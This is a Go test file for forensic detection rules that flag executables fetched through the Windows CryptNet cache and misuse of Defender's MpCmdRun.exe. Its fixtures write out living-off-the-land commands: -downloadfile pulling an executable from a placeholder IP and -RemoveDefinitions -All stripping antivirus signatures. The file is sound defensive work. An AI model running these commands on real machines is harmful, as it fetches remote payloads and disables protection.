package detect

import (
	"strings"
	"testing"
	"time"

	"tracefall/internal/model"
)

func cryptEvent(id, url, host, magic string, present bool) model.Event {
	x := map[string]string{"url": url, "url_host": host, "file_size": "1000", "content_present": "false", "layout_verified": "true"}
	if present {
		x["content_present"], x["content_magic"], x["content_sha256"], x["content_size_matches"] = "true", magic, "ab"+id, "true"
	}
	return model.Event{ID: id, CaseID: "c1", EventType: model.EventCryptoURLRetrieval, ArtifactType: model.ArtifactCryptnetURLCache,
		Timestamp: time.Date(2026, 1, 5, 13, 4, 5, 0, time.UTC), Extra: x}
}

func runRule(t *testing.T, id string, ev []model.Event) []model.Finding {
	t.Helper()
	for _, r := range All() {
		if r.ID() == id {
			return r.Evaluate(ev)
		}
	}
	t.Fatalf("rule %s is not registered", id)
	return nil
}

func TestCryptnet_AnExecutableRetrievedThroughTheCacheIsAFinding(t *testing.T) {
	got := runRule(t, "cryptnet-executable-retrieval", []model.Event{cryptEvent("a", "http://198.51.100.7/t/x.bin", "198.51.100.7", "pe", true)})
	if len(got) != 1 {
		t.Fatalf("%d findings", len(got))
	}
	f := got[0]
	if f.Severity != model.SeverityHigh || len(f.Techniques) != 1 || f.Techniques[0] != "T1105" {
		t.Errorf("%s %v", f.Severity, f.Techniques)
	}
	for _, want := range []string{"198.51.100.7", "does not name the program", "ab"} {
		if !strings.Contains(f.Description+f.Title, want) {
			t.Errorf("missing %q in %q", want, f.Title+" / "+f.Description)
		}
	}
}

func TestCryptnet_ArchiveIsMediumAndAnExecutableNameWithNoContentIsMediumWithThatSaid(t *testing.T) {
	zip := runRule(t, "cryptnet-executable-retrieval", []model.Event{cryptEvent("a", "http://203.0.113.5/p", "203.0.113.5", "zip", true)})
	if len(zip) != 1 || zip[0].Severity != model.SeverityMedium {
		t.Fatalf("%+v", zip)
	}
	named := runRule(t, "cryptnet-executable-retrieval", []model.Event{cryptEvent("b", "http://203.0.113.5/dl/payload.EXE?x=1", "203.0.113.5", "", false)})
	if len(named) != 1 || named[0].Severity != model.SeverityMedium || !strings.Contains(named[0].Description, "not available") {
		t.Fatalf("%+v", named)
	}
}

func TestCryptnet_OrdinaryCertificateTrafficIsNotAFinding(t *testing.T) {
	ev := []model.Event{
		cryptEvent("a", "http://ocsp.digicert.com/MFEw", "ocsp.digicert.com", "der", true),
		cryptEvent("b", "http://ctldl.windowsupdate.com/msdownload/update/v3/static/trustedr/en/authrootstl.cab", "ctldl.windowsupdate.com", "cab", true),
		cryptEvent("c", "http://ocsp.pki.goog/gts1c3", "ocsp.pki.goog", "", true),
		cryptEvent("d", "http://crl.example.test/a.crl", "crl.example.test", "text", true),
	}
	ev[2].Extra["content_magic"] = ""
	if got := runRule(t, "cryptnet-executable-retrieval", ev); len(got) != 0 {
		t.Fatalf("%d findings from certificate traffic: %+v", len(got), got[0].Title)
	}
}

func TestCryptnet_OneFindingPerUrl(t *testing.T) {
	ev := []model.Event{
		cryptEvent("a", "http://198.51.100.7/x.exe", "198.51.100.7", "pe", true),
		cryptEvent("b", "http://198.51.100.7/x.exe", "198.51.100.7", "pe", true),
		cryptEvent("c", "http://198.51.100.8/y.exe", "198.51.100.8", "pe", true),
	}
	if got := runRule(t, "cryptnet-executable-retrieval", ev); len(got) != 2 {
		t.Fatalf("%d findings, want one per URL", len(got))
	}
}

func defEvent(id, cmd string, x map[string]string) model.Event {
	e := map[string]string{"command_line": cmd, "timestamp_local": "2026-01-05T13:10:00"}
	for k, v := range x {
		e[k] = v
	}
	return model.Event{ID: id, CaseID: "c1", EventType: model.EventDefenderCommand, ArtifactType: model.ArtifactDefenderCmdLog, Extra: e}
}

func TestDefender_DownloadFileIsAFindingAndOrdinaryUpdatesAreNot(t *testing.T) {
	ev := []model.Event{
		defEvent("a", `"C:\Program Files\Windows Defender\MpCmdRun.exe" SignatureUpdate -ScheduleJob`, map[string]string{"verb": "SignatureUpdate"}),
		defEvent("b", `"C:\Program Files\Windows Defender\MpCmdRun.exe" -downloadfile -url http://198.51.100.7/x.exe -path C:\Users\Public\x.exe`,
			map[string]string{"verb": "-downloadfile", "download_url": "http://198.51.100.7/x.exe", "download_path": `C:\Users\Public\x.exe`}),
	}
	got := runRule(t, "defender-mpcmdrun-misuse", ev)
	if len(got) != 1 {
		t.Fatalf("%d findings", len(got))
	}
	f := got[0]
	if f.Severity != model.SeverityHigh || f.Techniques[0] != "T1105" {
		t.Errorf("%s %v", f.Severity, f.Techniques)
	}
	for _, want := range []string{"198.51.100.7", `C:\Users\Public\x.exe`, "local time"} {
		if !strings.Contains(f.Description, want) {
			t.Errorf("missing %q in %q", want, f.Description)
		}
	}
}

func TestDefender_RemovingDefinitionsIsMediumAndPlainRemoveIsNot(t *testing.T) {
	all := defEvent("a", `"C:\Program Files\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All`, map[string]string{"verb": "-RemoveDefinitions"})
	got := runRule(t, "defender-mpcmdrun-misuse", []model.Event{all})
	if len(got) != 1 || got[0].Severity != model.SeverityMedium || got[0].Techniques[0] != "T1562" {
		t.Fatalf("%+v", got)
	}
	dyn := defEvent("b", `"C:\Program Files\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -DynamicSignatures`, map[string]string{"verb": "-RemoveDefinitions"})
	if got := runRule(t, "defender-mpcmdrun-misuse", []model.Event{dyn}); len(got) != 0 {
		t.Fatalf("removing only the dynamic signatures is a documented, routine action: %+v", got[0].Title)
	}
}

func TestDefender_AUtcReadingIsShownWhenTheCollectionRecordsTheZone(t *testing.T) {
	e := defEvent("a", `MpCmdRun.exe -DownloadFile -url http://198.51.100.7/x -path C:\x`, map[string]string{
		"verb": "-DownloadFile", "download_url": "http://198.51.100.7/x", "download_path": `C:\x`,
		"timestamp_utc": "2026-01-05T10:10:00Z", "timestamp_utc_basis": "SYSTEM hive; one fixed offset, daylight-saving changes not applied"})
	got := runRule(t, "defender-mpcmdrun-misuse", []model.Event{e})
	if len(got) != 1 || !strings.Contains(got[0].Description, "2026-01-05T10:10:00Z") {
		t.Fatalf("%+v", got)
	}
}
